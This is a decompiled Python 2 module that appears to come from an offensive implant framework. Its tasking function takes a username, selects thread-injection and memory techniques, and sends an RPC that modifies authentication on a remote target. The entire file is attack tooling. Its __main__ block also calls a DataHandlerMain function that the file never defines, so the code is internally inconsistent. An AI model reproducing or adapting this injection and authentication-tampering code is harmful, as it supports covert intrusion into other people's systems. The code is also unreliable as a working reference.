# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Authentication_Tasking.py


def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.zbng.cmd.authentication', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.zbng.cmd.authentication.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    if lpParams['user'] == None or len(lpParams['user']) == 0:
        mcl.tasking.OutputError('A username must be specified')
        return False
    else:
        tgtParams = mca.zbng.cmd.authentication.Params()
        tgtParams.threadProvider = mcl.tasking.technique.Lookup('AUTHENTICATION', mcl.tasking.technique.TECHNIQUE_MCL_INJECT, lpParams['thread'])
        tgtParams.memoryProvider = mcl.tasking.technique.Lookup('AUTHENTICATION', mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, lpParams['memory'])
        tgtParams.user = lpParams['user']
        rpc = mca.zbng.cmd.authentication.tasking.RPC_INFO_MODIFY
        msg = MarshalMessage()
        tgtParams.Marshal(msg)
        rpc.SetData(msg.Serialize())
        rpc.SetMessagingType('message')
        taskXml = mcl.tasking.Tasking()
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_MEMORY, tgtParams.memoryProvider)
        taskXml.AddProvider(mcl.tasking.technique.TECHNIQUE_MCL_INJECT, tgtParams.threadProvider)
        mcl.tasking.OutputXml(taskXml.GetXmlObject())
        res = mcl.tasking.RpcPerformCall(rpc)
        if res != mcl.target.CALL_SUCCEEDED:
            mcl.tasking.RecordModuleError(res, 0, mca.zbng.cmd.authentication.errorStrings)
            return False
        return True


if __name__ == '__main__':
    import sys
    try:
        namespace, InputFilename, OutputFilename = sys.argv[1:]
    except:
        print '%s <namespace> <input filename> <output filename>' % sys.argv[0]
        sys.exit(1)

    if DataHandlerMain(namespace, InputFilename, OutputFilename) != True:
        sys.exit(-1)